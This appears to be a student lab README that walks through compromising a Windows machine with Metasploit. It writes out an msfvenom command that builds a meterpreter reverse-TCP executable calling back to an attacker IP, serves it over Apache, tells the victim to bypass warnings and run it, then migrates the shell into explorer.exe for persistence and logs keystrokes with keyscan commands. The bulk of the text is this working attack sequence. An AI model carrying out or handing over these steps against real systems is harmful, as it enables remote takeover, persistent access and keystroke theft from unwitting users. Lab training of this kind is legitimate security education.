# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig
#### OUTPUT:

![if-config](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d81c29e7-4cb2-4989-a4f0-32d0f4dcffa5)

Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT
![msfvenom](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/a8e477e7-1f5b-4831-a003-ffc199679313)

copy the fun.exe into the apache /var/www/html folder

![cpfunexe](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/edc15bf9-0646-4d77-a7b2-7fbe6adae449)

Start apache server
sudo systemctl apache2 start

![startapache2](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/f2bdb40b-22b8-409e-8295-7cac780eab89)

Check the status of apache2

![status](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d5dca89e-d102-408d-aa25-d60e7e09ff2b)

Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler

![usemultihandler](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/31c4d664-f12a-45a9-aa29-e988f03e88e1)

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![download](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/a6b73051-a143-4740-b3d9-27c23762218f)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![exploit](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/b46a08f7-a9fc-4e71-8fdd-170ee187dd22)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![meterpreter-ps](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/7e6e28fb-b095-4fd1-81f8-a0292f82c9a2)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![migrate-Nexplorer](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/836e6efa-423f-4553-ad2f-19170b010892)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![notepad](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/35be18d7-51b0-4529-8fd8-76740f0c9ba6)
keyscan_dump	Shows the keystrokes captured so far
![keyscan_dump](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d40a4428-0c65-4855-be1d-c278766082fb)






## RESULT:
The Metasploit framework for reconnaissance is  examined successfully.
